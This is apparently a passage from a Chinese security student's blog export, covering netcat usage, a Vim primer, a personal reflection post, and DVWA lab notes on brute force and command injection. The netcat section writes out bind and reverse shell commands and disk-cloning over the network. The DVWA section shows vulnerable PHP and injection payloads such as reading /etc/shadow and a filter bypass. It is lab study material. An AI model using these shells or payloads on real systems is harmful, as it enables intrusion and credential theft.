1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6&lt;fanghong.yuan@163.com&gt;535 Error: authentication failed</code></pre><p>root:~# nc -nv 10.1.1.11 80</p><pre><code>(UNKNOWN) [10.1.1.11] 80 (http) openhead /&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p><p>B: nc -nv 1.1.1.1 4444</p><p>远程电子取证信息收集</p><p>开启两台系统kalix64和kalix32</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333       //打开端口333</p><p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p><p>root:~# nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="http://oy0tigw51.bkt.clouddn.com/201802271914_628.png" alt=""><br>然后两台电脑实现聊天的功能！</p><h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p><p>root@kali:~# nnc -l -p 333       //打开端口333</p><p>kali 64Bit</p><p>root:~# ls -l | nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>root:~# ps aux              //查看可疑的进程</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p><p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p><p>kali 64Bit</p><p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p><p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p><p>kali 32Bit</p><p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p><h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p><pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒或A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件</code></pre><p>传输目录</p><pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1B: nc -nv 1.1.1.1 333 | tar -xvf -</code></pre><p>加密传文件</p><pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密</code></pre><p>A:</p><p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p><p>Enter passphrase: xxxx </p><p>B:</p><p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>Enter the passphrase (maximum of 512 characters)</p><p>Please use a combination of upper and lower case letters and numbers.</p><p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p><p>en</p><p>Enter passphrase: xxxx</p><p>NC不自带mcrypt,需要自己安装！</p><h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 1.mp4 | nc -lp 333B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p><p>  nc -vnzu 1.1.1.1 1-1024</p><p>root@1kali:~# nc -h</p><p>[v1.10-38]</p><p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p><p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p><p>options:</p><pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]-e filename     program to exec after connect [dangerous!!]-b          allow broadcasts-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。-h          this cruft -i secs         delay interval for lines sent, ports sca                      延时的间隔    -k                      set keepalive option on socket-l          listen mode, for inbound connects                             监听模式,入站连接-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port         local port number                                             本地端口-r          randomize local and remote ports                              随机本地和远程端口 -q secs         quit after EOF on stdin and delay of secs-s addr         local source address  -T tos          set Type Of Service-t          answer TELNET negotiation   -u          UDP mode                                                      udp  模式-v          verbose [use twice to be more verbose]                        显示过程,vv 更多-w secs         timeout for connects and final net reads                      等待连接超时-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p><h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p><pre><code>A: nc  -lp 333 -  bashB: nc  1.1.1.1 333</code></pre><p>反向：</p><pre><code>A: nc -nv 1.1.1.1 333B: nc -lp 333 -c bash</code></pre><p>注：Windows用户把bash改成cmd;</p><p>root@kali:~# ifconfig</p><p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p><pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1      RX packets:46 errors:0 dropped:0 overruns:0 frame:0      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:1000       RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)      Interrupt:19 Base address:0x2000 </code></pre><p>lo        Link encap:Local Loopback  </p><pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0      inet6 addr: ::1/128 Scope:Host      UP LOOPBACK RUNNING  MTU:65536  Metric:1      RX packets:20 errors:0 dropped:0 overruns:0 frame:0      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:0       RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)</code></pre><p>A:</p><p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p><p>(UNKNOWN) [192.168.1.115] 333 (?) open</p><p>ls </p><p>pwd</p><p>没有任何反应</p><p>B:</p><p>root:~# nc -lp 333</p><p>ls</p><p>Desktop</p><p>/root</p><p>ifconfig</p><p>……(一串文字）</p><p>请求来控制我！</p><p>NC—–NCAT</p><p>  Nc缺乏就加密和身份验证的能力</p><p>  Ncat包含于nmap工具包中</p><p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p><p>  B: ncat -nv 1.1.1.1 333 –ssl</p><p>不同系统/平台的nc参数功能不尽相同</p><p>root:~# man nc</p><p>root:~# nc -h</p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NETCAT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vim简单入门笔记</title>
      <link href="/archives/2e6b5387/"/>
      <url>/archives/2e6b5387/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim简单入门笔记"><a href="#Vim简单入门笔记" class="headerlink" title="Vim简单入门笔记"></a>Vim简单入门笔记</h1><h2 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h2><ul><li>一般模式：可以进行复制、粘贴和删除等操作</li><li>编辑模式：按 <code>i</code> 或 <code>a</code> 进入编辑模式，按 <code>Esc</code> 回到一般模式</li><li>命令模式：按 <code>/</code> 或 <code>?</code> 或 <code>:</code> 进入命令模式，按 <code>Esc</code> 回到一般模式</li></ul><h2 id="移动操作"><a href="#移动操作" class="headerlink" title="移动操作"></a>移动操作</h2><ul><li><code>h</code> <code>j</code> <code>k</code> <code>l</code>：用来控制光标移动</li><li><code>gg</code>：返回顶部</li><li><code>G</code>：回到底部</li><li><code>:n</code>：跳到n行（n是数字）</li><li><code>ctrl+f</code> 和 <code>ctrl+b</code>：屏幕向前向后滚动</li><li><code>0和shift+4</code>：回到本行头和尾</li></ul><h2 id="退出编辑器"><a href="#退出编辑器" class="headerlink" title="退出编辑器"></a>退出编辑器</h2><ul><li><code>:w</code> 和 <code>:wq</code>：保存和保存退出</li><li><code>:q</code> 和 <code>:q!</code>：退出和不保存退出</li></ul><p>其中 <code>!</code> 是强制的意思</p><h2 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h2><h3 id="复制多行"><a href="#复制多行" class="headerlink" title="复制多行"></a>复制多行</h3><p>正常模式下，把光标移到要复制的行</p><ul><li><code>yy</code>，复制当前行</li><li><code>nyy</code>，其中n是要复制的行数，向下复制n行</li></ul><p>按 <code>p</code> 粘贴</p><h3 id="复制部分"><a href="#复制部分" class="headerlink" title="复制部分"></a>复制部分</h3><p>正常模式下，按 <code>v</code> 移动光标选择要复制的部分，接着按 <code>d</code> 剪切或按 <code>y</code> 复制，最后按 <code>p</code> 粘贴</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><ul><li><code>dd</code>：删除当前行</li><li><code>ndd</code>：删除当前行开始n行</li><li><code>dG</code>：删除当前行开始至最后一行</li></ul><h2 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h2><p>正常模式下按 <code>u</code> 来撤销，按 <code>ctrl+r</code> 来重做</p><h2 id="注释和取消"><a href="#注释和取消" class="headerlink" title="注释和取消"></a>注释和取消</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li>按 <code>ctrl+v</code> 进入可视化模式</li><li>移动光标选择需要注释的行</li><li>按 <code>I</code> ，然后输入注释符如 <code>#</code></li><li>按 <code>Esc</code> 回到正常模式</li></ol><h3 id="取消"><a href="#取消" class="headerlink" title="取消"></a>取消</h3><ol><li>按 <code>ctrl+v</code> 进入可视化模式</li><li>选择要删除的注释符</li><li>按 <code>d</code> 或 <code>x</code> 删除</li></ol><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>一般模式下输入 <code>/</code> 然后后面跟要搜索的词<br><code>n</code> 和 <code>N</code>：显示下一个和上一个搜索结果</p><h2 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a>显示行号</h2><p>命令模式下输入 <code>set number</code> ，然后就能看到行号</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VIM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>17-11反思与进取</title>
      <link href="/archives/fb4597d6/"/>
      <url>/archives/fb4597d6/</url>
      
        <content type="html"><![CDATA[<p>#反思与进取<br><img src="http://oy0tigw51.bkt.clouddn.com/201711202038_238.png" alt=""><br>很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大于自身的抉择。</p><p>从5月份开始忙着转专业到现在转入信安专业，我也都没忘记自己高考报名这所学校的初衷，也如愿的进入自己理想的状态， 期间太过于迷茫， 总是怀疑自己到底可不可以，如果放弃每天都可以打打游戏，谈谈恋爱，扯扯不知所云的理想，这多舒服啊，但我也总觉得有人告诉我，“你如果每天都很难受，那么你每天都会成长，当你回过头来发现，你必定会恍然大悟自己的难受是有多么值得。”<br>人总是犯贱和懒惰的， 灌了鸡汤，不过打一个短暂的兴奋剂，过了几天，还是精虫上脑，活如死尸。<br>舒服了太久，不知道自己有多差劲。<br>这半年也眨眼即逝，从开学到现在也忙于进入三叶草小组，也卓有成效，靠着脸皮与努力如愿进入小组，但这几天自己高兴过头不知道自己其实还差太远，万万不可得意忘形。这话也是我的girlfriend在我们吃庆功宴的时候告诉我的警告。<br>每每觉得自己可以接近完工的时候，我心里总会告诉我自己休息一会儿，马上就好了。然后浪费很多时间，而距离真正的完成却差距很多。从而再次理思路，完成这期间花费的时间往往是巨大的。</p><p>大概看了彭哥的博客感触越发深刻，这一年的多的时间里自己真正想要的总会偏移正轨。<br>这一年的懒惰心里尤为可怕，凡事为自己查找借口，凡事为自己解脱多容易啊，不懂装懂多好啊，别人会觉得你多厉害多聪明啊。<br>这些人性的弱点往往在自身的思考之后越发觉得厌恶。</p><p>或许是时候做些改变。<br>或许苦味的生活才是该拥抱的。<br>或许应当用力量固执地强迫自己向前去奋斗，到力尽气竭为止。</p><p>脸上有阳光，脑子里有爱情，灵魂里有进取，这大概是我现在最想要追寻的。</p><p>接下来的生活真的需要不竭的动力去执行<br>我需要做到：<br>1.找回自身的最好的状态，不睡懒觉，不找借口，做最好的自己<br>2.每周连载2篇博客<br>3.学习成绩年级top20，过六级，每两日一份试卷<br>4.认真听取每节课，不浪费一分一秒<br>5.寒假结束之前将安全牛web安全工程师所有内容学完<br>6.下学期进入核心组</p><p>佛曰：精进。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DVWA笔记</title>
      <link href="/archives/18acffef/"/>
      <url>/archives/18acffef/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h3 id="一：搭建平台"><a href="#一：搭建平台" class="headerlink" title="一：搭建平台"></a>一：搭建平台</h3><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710232230_351.png" alt=""></p><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710240131_802.png" alt="中文图"></p><hr><h3 id="二-Brute-Force"><a href="#二-Brute-Force" class="headerlink" title="二: Brute Force"></a>二: Brute Force</h3><p>Low:</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>在Login中输入用户名与密码<br>用burpsuite进行拦截<br><img src="http://oy0tigw51.bkt.clouddn.com/201710232240_813.png" alt=""></p><p>将表单进行提交到intruder模块，在password参数的内容两边加$，并将password设置为破解的payload<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240053_146.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240056_540.png" alt=""><br>尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240109_245.png" alt=""></p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义)；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，源代码中只是添加了sleep函数，依然没有加入有效的防暴机制。</p><p>查看源码发现</p><p>sleep( 2 ); </p><pre><code>1</code></pre><p>测试不成功时会延时2s，方法和low一样，只是慢一些，需要更新cookie中的安全等级security。</p><pre><code>headers = {    &#39;Cookie&#39;: &#39;PHPSESSID=h6r8555q2obvo388r4u50lg397; security=medium&#39;}</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>通过checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );加入token和generateSessionToken();加入Anti-CSRFtoken预防无脑爆破，所以我们不可以再使用burpsuite工具进行无脑爆破了。而且 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。<br>还是可以去进行暴力破解，这个就需要python脚本来完成了。通过浏览器访问，打开F12进行查看，我们会发现每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，我们可以看到user_token在源代码中可以获取到的。所以我们需要写一个爬虫来获取页面中的user_token的值。</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time   = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  { // User locked out.  Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &#39;last_login&#39; ]; $last_login = strtotime( $last_login ); $timeout= strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow= strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar   = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login   = $row[ &#39;last_login&#39; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。菜鸡发抖</p><hr><h3 id="三-Command-Injection"><a href="#三-Command-Injection" class="headerlink" title="三:Command Injection"></a>三:Command Injection</h3><p>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。为了正确测试命令注入漏洞，应遵循以下步骤：</p><ol><li>§ 第1步： 了解攻击场景</li><li>§ 第2步： 分析原因及对策</li><li>§ 第3步： 开始试验和探索</li><li><p>§ 第4步： 微调测试案例</p><p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p></li></ol><pre><code>&lt;?php   if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {   // Get input   $target = $_REQUEST[ &#39;ip&#39; ];   // Determine OS and execute the ping command.   if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {   // Windows   $cmd = shell_exec( &#39;ping  &#39; . $target );   }   else {   // *nix   $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );   }   // Feedback for the end user   echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;   }   ?&gt;</code></pre><p>$target = $_REQUEST[ ‘ip’ ];直接从文本框中输入的内容，没有任何限制，刚刚我们在上面也看到了，在操作系统中使用“&amp;&amp;”连接符（在windows下一个&amp;和两个&amp;都可以，在linux下一定要两个），可以执行多条命令。</p><p>如果输入的值不是一个简单的IP，而是127.0.0.1&amp;&amp;net user，那么可以看到返回值里就把系统的用户名拿到了，<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240138_810.png" alt=""></p><p>还可以注意ping <a href="http://www.baidu.com.cn" target="_blank" rel="external">http://www.baidu.com.cn</a> || net user的写法，这句话的意思是如果||的前面命令执行失败则执行||后面的命令。<br>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><blockquote><p>// Set blacklist </p></blockquote><pre><code>$substitutions = array(     &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,     &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </code></pre><p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。<br>漏洞利用</p><p>127.0.0.1&amp;net user<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240149_886.png" alt=""></p><blockquote><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p>Command 1&amp;&amp;Command 2</p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p></blockquote><p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><p>127.0.0.1&amp;;&amp;ipconfig</p><p>127.0.0.1&amp;;&amp;ipconfig 绕过 </p><p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240151_333.png" alt=""></p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39;  =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, &#39;|  &#39; =&gt; &#39;&#39;, &#39;-&#39;  =&gt; &#39;&#39;, 